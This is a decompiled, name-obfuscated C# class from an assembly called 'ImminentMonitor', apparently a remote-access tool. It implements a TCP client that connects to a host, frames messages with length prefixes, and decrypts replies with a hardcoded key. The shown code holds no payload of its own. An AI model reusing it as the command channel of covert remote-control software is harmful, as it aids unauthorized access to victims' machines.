// Decompiled with JetBrains decompiler
// Type: GClass33
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;

public sealed class GClass33
{
  private GClass33.GDelegate17 gdelegate17_0;
  private GClass33.GDelegate16 gdelegate16_0;
  public byte[] byte_0;
  private bool bool_0;
  private int int_0;
  private IPEndPoint ipendPoint_0;
  private bool bool_1;
  private bool bool_2;
  private bool bool_3;
  public Socket socket_0;
  private SocketAsyncEventArgs socketAsyncEventArgs_0;
  private int int_1;
  private int int_2;
  private int int_3;
  private int int_4;
  private int int_5;
  private byte[] byte_1;
  private byte[] byte_2;
  private byte[] byte_3;
  private byte[] byte_4;
  private bool bool_4;
  private byte[] byte_5;
  private bool bool_5;
  public int int_6;

  public GClass33()
  {
    this.byte_0 = Encoding.UTF8.GetBytes("1337");
    this.bool_0 = true;
    this.int_0 = (int) ushort.MaxValue;
    this.socketAsyncEventArgs_0 = new SocketAsyncEventArgs();
    this.int_6 = 0;
    this.bool_3 = true;
  }

  public GClass33(Socket socket_1, bool bool_6, int int_7, int int_8)
  {
    this.byte_0 = Encoding.UTF8.GetBytes("1337");
    this.bool_0 = true;
    this.int_0 = (int) ushort.MaxValue;
    this.socketAsyncEventArgs_0 = new SocketAsyncEventArgs();
    this.int_6 = 0;
    this.socket_0 = socket_1;
    this.bool_0 = bool_6;
    this.int_0 = int_7;
    this.method_12();
  }

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_0(GClass33.GDelegate17 gdelegate17_1) => this.gdelegate17_0 += gdelegate17_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_1(GClass33.GDelegate17 gdelegate17_1) => this.gdelegate17_0 -= gdelegate17_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_2(GClass33.GDelegate16 gdelegate16_1) => this.gdelegate16_0 += gdelegate16_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_3(GClass33.GDelegate16 gdelegate16_1) => this.gdelegate16_0 -= gdelegate16_1;

  public bool method_4() => this.bool_0;

  public void method_5(bool bool_6)
  {
    if (this.method_10())
      throw new Exception("Unable to change this property while socket is in use.");
    this.bool_0 = bool_6;
  }

  public int method_6() => this.int_0;

  public void method_7(int int_7)
  {
    if (int_7 < 1)
      throw new Exception("Value must be greater than 0.");
    if (this.method_10())
      throw new Exception("Unable to change this property while socket is in use.");
    this.int_0 = int_7;
  }

  public IPEndPoint method_8() => this.ipendPoint_0 != null ? this.ipendPoint_0 : new IPEndPoint(IPAddress.None, 0);

  public bool method_9() => this.bool_1;

  public bool method_10() => this.bool_1 || this.bool_2;

  public bool method_11() => this.bool_3;

  private void method_12()
  {
    this.byte_4 = new byte[4];
    this.byte_1 = new byte[0];
    this.byte_2 = new byte[65536];
    this.byte_3 = new byte[65536];
    this.byte_5 = new byte[4];
  }

  public void method_13(string string_0, ushort ushort_0)
  {
    try
    {
      this.method_21();
      this.method_12();
      this.socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      GClass3.smethod_0(this.socket_0, 8000U, 8000U);
      IAsyncResult asyncResult = this.socket_0.BeginConnect(string_0, (int) ushort_0, (AsyncCallback) null, (object) null);
      if (asyncResult.AsyncWaitHandle.WaitOne(3500, true))
      {
        this.socket_0.EndConnect(asyncResult);
        GClass33.GDelegate17 gdelegate170 = this.gdelegate17_0;
        if (gdelegate170 != null)
          gdelegate170(this, true);
        this.socket_0.BeginReceive(this.byte_2, 0, this.method_6(), SocketFlags.None, new AsyncCallback(this.method_15), (object) null);
        this.bool_1 = true;
      }
      else
      {
        this.socket_0.Close();
        throw new SocketException(10060);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      GClass33.GDelegate17 gdelegate170 = this.gdelegate17_0;
      if (gdelegate170 != null)
        gdelegate170(this, false);
      ProjectData.ClearProjectError();
    }
  }

  public void method_14() => this.socket_0.BeginReceive(this.byte_2, 0, this.method_6(), SocketFlags.None, new AsyncCallback(this.method_15), (object) null);

  private void method_15(IAsyncResult iasyncResult_0)
  {
    try
    {
      if (this.socket_0 == null)
        return;
      int int_8 = this.socket_0.EndReceive(iasyncResult_0);
      if (int_8 == 0)
        this.method_21();
      else if (int_8 > 0)
      {
        this.method_16(this.byte_2, 0, int_8);
        this.method_14();
      }
      else
        this.method_21();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.method_21();
      ProjectData.ClearProjectError();
    }
  }

  private void method_16(byte[] byte_6, int int_7, int int_8)
  {
    if (this.bool_0)
    {
      if (this.bool_4)
      {
        int count = Math.Min(this.byte_1.Length - this.int_1, int_8 - int_7);
        Buffer.BlockCopy((Array) byte_6, int_7, (Array) this.byte_1, this.int_1, count);
        this.int_1 += count;
        if (this.int_1 == this.byte_1.Length)
        {
          GClass33.GDelegate16 gdelegate160 = this.gdelegate16_0;
          if (gdelegate160 != null)
            gdelegate160(this, this.byte_1);
          this.bool_4 = false;
          Array.Resize<byte>(ref this.byte_1, 0);
        }
        if (count >= int_8 - int_7)
          return;
        this.method_16(byte_6, int_7 + count, int_8);
      }
      else
      {
        int count = Math.Min(int_8 - int_7, 4);
        Buffer.BlockCopy((Array) byte_6, int_7, (Array) this.byte_4, this.int_3, count);
        int_7 += count;
        this.int_3 += count;
        if (this.int_3 != 4)
          return;
        int int32 = BitConverter.ToInt32(this.byte_4, 0);
        this.int_1 = 0;
        this.int_3 = 0;
        this.bool_4 = true;
        Array.Resize<byte>(ref this.byte_1, int32);
        if (int_7 >= int_8)
          return;
        this.method_16(byte_6, int_7, int_8);
      }
    }
    else
    {
      Array.Resize<byte>(ref this.byte_1, int_8);
      Buffer.BlockCopy((Array) byte_6, 0, (Array) this.byte_1, 0, int_8);
      GClass33.GDelegate16 gdelegate160 = this.gdelegate16_0;
      if (gdelegate160 == null)
        return;
      gdelegate160(this, this.byte_1);
    }
  }

  public object[] method_17(byte[] byte_6)
  {
    if (!this.bool_1)
      return (object[]) null;
    if (!this.socket_0.Connected)
      this.method_21();
    byte[] bytes = BitConverter.GetBytes(byte_6.Length);
    byte[] numArray = new byte[byte_6.Length + 3 + 1];
    Array.Copy((Array) bytes, (Array) numArray, bytes.Length);
    Array.Copy((Array) byte_6, 0, (Array) numArray, 4, byte_6.Length);
    object[] objArray;
    try
    {
      this.socket_0.Send(numArray);
      int int_8 = this.socket_0.Receive(this.byte_3);
      if (int_8 <= 0)
      {
        this.method_21();
        objArray = (object[]) null;
      }
      else
      {
        this.method_19(this.byte_3, 0, int_8);
        byte[] byte_0 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_0(this.byte_3, this.byte_0);
        this.method_18();
        objArray = Class97.gclass1_0.gclass47_0.method_1(byte_0);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      objArray = (object[]) null;
      ProjectData.ClearProjectError();
    }
    return objArray;
  }

  private void method_18()
  {
    this.byte_3 = (byte[]) null;
    this.byte_3 = new byte[65536];
  }

  private void method_19(byte[] byte_6, int int_7, int int_8)
  {
    if (this.bool_0)
    {
      if (this.bool_5)
      {
        int count = Math.Min(this.byte_3.Length - this.int_4, int_8 - int_7);
        Buffer.BlockCopy((Array) byte_6, int_7, (Array) this.byte_3, this.int_4, count);
        this.int_4 += count;
        if (this.int_4 == this.byte_3.Length)
          this.bool_5 = false;
        if (count >= int_8 - int_7)
          return;
        this.method_19(byte_6, int_7 + count, int_8);
      }
      else
      {
        int count = Math.Min(int_8 - int_7, 4);
        Buffer.BlockCopy((Array) byte_6, int_7, (Array) this.byte_5, this.int_5, count);
        int_7 += count;
        this.int_5 += count;
        if (this.int_5 != 4)
          return;
        int int32 = BitConverter.ToInt32(this.byte_5, 0);
        this.int_4 = 0;
        this.int_5 = 0;
        this.bool_5 = true;
        Array.Resize<byte>(ref this.byte_3, int32);
        if (int_7 >= int_8)
          return;
        this.method_19(byte_6, int_7, int_8);
      }
    }
    else
    {
      Array.Resize<byte>(ref this.byte_3, int_8);
      Buffer.BlockCopy((Array) byte_6, 0, (Array) this.byte_3, 0, int_8);
    }
  }

  public void method_20(byte[] byte_6)
  {
    if (!this.bool_1)
      return;
    try
    {
      int count;
      for (this.int_2 = 0; this.int_2 < byte_6.Length; this.int_2 += count)
      {
        byte[] numArray = new byte[this.int_0 - 1 + 1];
        int dstOffset;
        if (this.bool_0 && this.int_2 == 0)
        {
          dstOffset = 4;
          Buffer.BlockCopy((Array) BitConverter.GetBytes(byte_6.Length), 0, (Array) numArray, 0, 4);
        }
        else
          dstOffset = 0;
        count = Math.Min(byte_6.Length - this.int_2, this.int_0 - dstOffset);
        Buffer.BlockCopy((Array) byte_6, this.int_2, (Array) numArray, dstOffset, count);
        this.socket_0.Send(numArray, 0, count + dstOffset, SocketFlags.None);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.method_21();
      ProjectData.ClearProjectError();
    }
  }

  public void method_21()
  {
    if (!this.method_10())
      return;
    this.bool_1 = false;
    this.bool_2 = false;
    if (this.socket_0 != null)
    {
      this.socket_0.Close();
      this.socket_0 = (Socket) null;
    }
    if (this.socketAsyncEventArgs_0 != null)
    {
      this.socketAsyncEventArgs_0.Dispose();
      this.socketAsyncEventArgs_0 = (SocketAsyncEventArgs) null;
    }
    this.int_2 = 0;
    this.int_1 = 0;
    this.byte_4 = (byte[]) null;
    this.byte_1 = (byte[]) null;
    this.bool_4 = false;
    GClass33.GDelegate17 gdelegate170 = this.gdelegate17_0;
    if (gdelegate170 != null)
      gdelegate170(this, false);
    this.ipendPoint_0 = (IPEndPoint) null;
  }

  public delegate void GDelegate16(GClass33 gclass33_0, byte[] byte_0);

  public delegate void GDelegate17(GClass33 gclass33_0, bool bool_0);
}
